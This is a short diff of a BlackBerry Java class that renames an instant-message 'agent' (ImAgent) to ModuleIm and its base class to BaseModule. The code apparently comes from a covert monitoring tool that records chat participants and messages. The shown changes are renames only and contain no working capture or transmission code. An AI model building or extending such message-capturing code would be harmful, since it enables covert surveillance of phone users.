@@ -7,7 +7,7 @@
  * File         : TaskAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import java.util.Vector;
 
@@ -32,7 +32,7 @@ import blackberry.utils.WChar;
 /**
  * Instant Message.
  */
-public final class ImAgent extends Module implements BacklightObserver,
+public final class ModuleIm extends BaseModule implements BacklightObserver,
         ApplicationObserver {
     //#ifdef DEBUG
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
@@ -53,8 +53,8 @@ public final class ImAgent extends Module implements BacklightObserver,
      * @param agentStatus
      *            the agent status
      */
-    public ImAgent(final boolean agentEnabled) {
-        super(Module.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
+    public ModuleIm(final boolean agentEnabled) {
+        super(BaseModule.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
 
         if(!Device.getInstance().atLeast(5, 0)){
             //#ifdef DEBUG
@@ -77,7 +77,7 @@ public final class ImAgent extends Module implements BacklightObserver,
      * @param confParams
      *            the conf params
      */
-    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleIm(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
 
@@ -117,8 +117,8 @@ public final class ImAgent extends Module implements BacklightObserver,
         markup.put(partecipants, lastLine);
     }
 
-    public static ImAgent getInstance() {
-        return (ImAgent) AgentManager.getInstance().getItem(Module.AGENT_IM);
+    public static ModuleIm getInstance() {
+        return (ModuleIm) AgentManager.getInstance().getItem(BaseModule.AGENT_IM);
     }
 
     public synchronized void actualStart() {
